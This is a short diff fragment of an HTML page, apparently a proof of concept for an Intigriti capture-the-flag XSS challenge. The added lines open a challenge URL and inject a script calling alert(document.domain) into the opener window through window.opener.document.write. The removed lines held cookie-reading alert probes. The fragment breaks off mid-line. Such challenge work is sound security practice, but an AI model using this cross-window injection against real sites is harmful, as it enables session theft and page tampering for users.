@@ -12,10 +12,8 @@
     document.body.appendChild(iframe);
   </script>
   <script>
-//     alert(document.cookie)
-//     alert(document.getElementsByTagName("iframe").length)
-//     window.parent.function(e)
-    window.opener.document.write("<script>alert(123)\<\/script>");
+    var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge1.png');
+    myWindow.opener.document.write("<script>alert(document.domain)\
   </script>
 </body>
 
